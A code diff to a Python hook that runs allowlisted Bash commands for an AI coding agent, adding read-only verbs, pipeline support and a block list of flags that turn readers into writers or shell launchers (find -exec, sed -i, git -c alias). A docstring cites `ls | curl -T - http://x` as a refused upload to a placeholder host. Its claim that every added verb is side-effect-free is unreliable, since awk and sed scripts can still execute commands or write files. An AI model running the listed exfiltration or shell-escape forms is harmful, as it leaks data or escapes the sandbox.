@@ -25,6 +25,7 @@ from __future__ import annotations
 import base64
 import json
 import os
+import subprocess
 import time
 import urllib.request
 from pathlib import Path
@@ -332,7 +333,31 @@ def deny_payload(reason: str) -> dict:
 _INTERCEPT_VERBS = frozenset({
     "git status", "git log", "git diff", "git show", "git branch",
     "ls", "cat", "head", "tail", "wc", "find", "grep", "rg", "tree", "du",
+    # Read-only text utilities. Measured on 261 real Bash calls: the four
+    # single largest outputs in the session were `sed -n '1,90p' <file>` —
+    # semantically a Read, which this module already intercepts, but `sed` was
+    # not on the list. Adding this group moves coverage from 0.3% to 23.3% of
+    # tool-output bytes, and every verb here is side-effect-free BY DEFAULT —
+    # the flags that make them otherwise are refused below.
+    "sed", "awk", "nl", "jq", "diff", "sort", "uniq", "cut", "comm", "paste",
+    "column", "stat", "file", "basename", "dirname", "echo", "printf", "date",
+    "which", "pwd", "fd", "realpath", "readlink", "md5", "shasum", "cksum",
 })
+
+# Flags that turn an allowlisted reader into a writer or an arbitrary executor.
+# `sed -i` edits in place; `find -delete` and `find -exec` were reachable BEFORE
+# this change, because `find` was already allowlisted — closing that is a fix,
+# not a new restriction.
+_BLOCKED_FLAGS = {
+    "sed": ("-i", "--in-place"),
+    "find": ("-delete", "-exec", "-execdir", "-ok", "-okdir", "-fprint",
+             "-fprintf", "-fls"),
+    "awk": ("-i", "--in-place"),
+    "jq": ("-i", "--in-place"),
+    "git": ("-c",),          # `git -c alias.x=!sh` runs a shell
+    "sort": ("-o", "--output"),
+    "shasum": ("-c", "--check"),
+}
 
 _BASH_TIMEOUT_S = 30
 _MIN_LINES_TO_BOTHER = 12
@@ -352,58 +377,81 @@ def bash_intercept_enabled() -> bool:
 # caller gets back depends on a control-flow decision this module would have to
 # model correctly. `&&` has no such ambiguity — every segment ran, in order, and
 # each one succeeded.
-_SHELL_METACHARS = ("||", ";", "|", ">", "<", "`", "$(", "&>", "$\{")
+_SHELL_METACHARS = ("||", ";", ">", "<", "`", "$(", "&>", "$\{")
 
 
 def _single_interceptable(segment: str) -> bool:
-    """One bare command, no operators, whose verb is on the allowlist."""
+    """One bare command, no operators, whose verb is allowlisted and whose
+    flags do not turn it into a writer."""
     parts = segment.split()
     if not parts:
         return False
     one = parts[0]
     two = f"{parts[0]} {parts[1]}" if len(parts) > 1 else ""
-    return two in _INTERCEPT_VERBS or one in _INTERCEPT_VERBS
+    if not (two in _INTERCEPT_VERBS or one in _INTERCEPT_VERBS):
+        return False
+    for flag in _BLOCKED_FLAGS.get(one, ()):
+        # Prefix match catches `-i.bak` and `--in-place=.bak` as well as `-i`.
+        if any(a == flag or a.startswith(flag + "=") or
+               (flag == "-i" and a.startswith("-i") and one in ("sed", "awk"))
+               for a in parts[1:]):
+            return False
+    return True
 
 
 class Plan:
-    """What to actually run, and where.
+    """What to run, and where.
 
-    `cwd` is None unless the command opened with `cd <dir>`, in which case every
-    remaining segment runs there.
+    `groups` is the `&&` sequence; each group is a pipeline, each pipeline a
+    list of argv stages. `git log && ls -la | wc -l` becomes
+    ``[[["git","log"]], [["ls","-la"],["wc","-l"]]]``.
+
+    `cwd` is None unless the command opened with `cd <dir>`.
     """
 
-    __slots__ = ("cwd", "segments")
+    __slots__ = ("cwd", "groups")
 
-    def __init__(self, cwd: str | None, segments: list[str]):
+    def __init__(self, cwd: str | None, groups: list[list[list[str]]]):
         self.cwd = cwd
-        self.segments = segments
+        self.groups = groups
 
-    def __eq__(self, other):  # tests compare against a plain list of segments
+    @property
+    def segments(self) -> list[str]:
+        """Flat text form — kept so existing callers and tests still read."""
+        return [" | ".join(" ".join(stage) for stage in group) for group in self.groups]
+
+    def __eq__(self, other):
         if isinstance(other, list):
             return self.segments == other
-        return (self.cwd, self.segments) == (other.cwd, other.segments)
+        return (self.cwd, self.groups) == (other.cwd, other.groups)
 
     def __repr__(self):
-        return f"Plan(cwd={self.cwd!r}, segments={self.segments!r})"
+        return f"Plan(cwd={self.cwd!r}, groups={self.groups!r})"
 
 
 def plan_for(command: str) -> "Plan | None":
     """The execution plan for *command*, or None if it is not safe here.
 
-    A conjunction is admitted only when EVERY segment independently passes the
-    single-command allowlist. That is a rule, not a judgement: `git status &&
-    rm -rf build` is refused because `rm` is not on the list, without this
-    module ever deciding which half of a command is the dangerous one — the
-    thing the previous blanket refusal existed to avoid.
+    Two structures are admitted, and only because neither requires judgement
+    about which half of a command is dangerous:
 
-    A leading `cd <dir>` is honoured rather than stripped. `effective_command`
-    discards it, which is right when the question is "what shape of output is
-    this" and WRONG when the question is "what do I execute": dropping it runs
-    the rest in the hook's own directory, and `cd elsewhere && cat config.py`
-    would then return a different file's contents as the answer. Only the first
-    segment may be a `cd`, it must name an existing directory, and it changes
-    nothing on disk.
+      `a && b`   every segment must independently pass the allowlist
+      `a | b`    every stage must independently pass the allowlist
+
+    `git status && rm -rf build` is refused because `rm` is not on the list.
+    `ls | curl -T - http://x` is refused because `curl` is not. The rule is
+    "all parts allowlisted", never "the first part looks fine".
+
+    `||` and `;` stay refused: they run the right-hand side after a FAILURE or
+    regardless of one, so what the caller gets back depends on control flow this
+    module would have to model correctly. `&&` and `|` have no such ambiguity.
+
+    A leading `cd <dir>` is honoured rather than stripped — `effective_command`
+    discards it, which is right for picking a compression strategy and wrong for
+    deciding what to execute.
     """
+    import shlex
+
     if not command or any(sep in command for sep in _SHELL_METACHARS):
         return None
     raw = command.strip()
@@ -411,25 +459,40 @@ def plan_for(command: str) -> "Plan | None":
         return None
 
     segments = [seg.strip() for seg in raw.split("&&")]
-    if not all(segments):                      # a dangling `&&`
+    if not all(segments):
         return None
 
     cwd: str | None = None
     first = segments[0].split()
     if first and first[0] == "cd":
         if len(first) != 2 or len(segments) == 1:
-            return None                        # bare `cd`, or nothing to run after it
+            return None
         target = Path(first[1]).expanduser()
         if not target.is_dir():
             return None
         cwd = str(target)
         segments = segments[1:]
 
-    if any(seg.split() and seg.split()[0] == "cd" for seg in segments):
-        return None                            # a later `cd` would move the goalposts
-    if not all(_single_interceptable(seg) for seg in segments):
-        return None
-    return Plan(cwd, segments)
+    groups: list[list[list[str]]] = []
+    for segment in segments:
+        stages = [st.strip() for st in segment.split("|")]
+        if not all(stages):
+            return None
+        argvs = []
+        for stage in stages:
+            if stage.split()[:1] == ["cd"]:
+                return None            # a later cd would move the goalposts
+            if not _single_interceptable(stage):
+                return None
+            try:
+                argv = shlex.split(stage)
+            except ValueError:
+                return None
+            if not argv:
+                return None
+            argvs.append(argv)
+        groups.append(argvs)
+    return Plan(cwd, groups) if groups else None
 
 
 def segments_of(command: str) -> "Plan | None":
@@ -459,41 +522,52 @@ def try_intercept_bash(hook_input: dict) -> str | None:
     plan = plan_for(command)
     if plan is None:
         return None
-    segments = plan.segments
     cwd = plan.cwd or hook_input.get("cwd") or os.getcwd()
 
-    # Each segment runs as its own argv — no shell, so nothing in the text can
-    # expand, glob or chain. `&&` semantics are reproduced here rather than
-    # delegated: stop at the first non-zero exit and hand the whole thing back
-    # to Claude, because a partial result presented as a complete one is worse
-    # than not intercepting at all.
+    # Each group runs in order; each group's stages are wired stdout->stdin.
+    # No shell anywhere, so nothing in the text can expand, glob or chain.
+    # `&&` semantics are reproduced here rather than delegated: stop at the
+    # first non-zero exit and hand the whole command back to Claude, because a
+    # partial result presented as a complete one is worse than not
+    # intercepting. A pipeline's status is its LAST stage's, as in the shell —
+    # an upstream `head` closing the pipe is normal, not a failure.
     stdout_parts: list[str] = []
-    completed = None
-    deadline_s = _BASH_TIMEOUT_S
-    for segment in segments:
+    deadline_s = float(_BASH_TIMEOUT_S)
+    for group in plan.groups:
+        t0 = time.monotonic()
         try:
-            argv = shlex.split(segment)
-        except ValueError:
-            return None
-        if not argv:
-            return None
-        try:
-            import time as _time
-            _t0 = _time.monotonic()
-            completed = subprocess.run(argv, capture_output=True, text=True,
-                                       timeout=max(1, int(deadline_s)), cwd=cwd)
-            deadline_s -= _time.monotonic() - _t0
+            procs = []
+            prev_stdout = None
+            for i, argv in enumerate(group):
+                proc = subprocess.Popen(
+                    argv, cwd=cwd,
+                    stdin=prev_stdout,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.DEVNULL,
+                    text=True)
+                if prev_stdout is not None:
+                    prev_stdout.close()   # let upstream see SIGPIPE
+                prev_stdout = proc.stdout
+                procs.append(proc)
+            out, _ = procs[-1].communicate(timeout=max(1, int(deadline_s)))
+            for proc in procs[:-1]:
+                proc.wait(timeout=5)
         except Exception:
+            for proc in locals().get("procs", []):
+                try:
+                    proc.kill()
+                except Exception:
+                    pass
             return None
-        if completed.returncode != 0:
+        if procs[-1].returncode != 0:
             return None
-        stdout_parts.append(completed.stdout or "")
+        stdout_parts.append(out or "")
+        deadline_s -= time.monotonic() - t0
         if deadline_s <= 0:
             return None
 
     class _Joined:
-        """Stand-in for the single CompletedProcess the rest of this function
-        expects, carrying every segment's stdout in order."""
+        """Stand-in for the single CompletedProcess the rest expects."""
         returncode = 0
         stdout = "".join(stdout_parts)
 
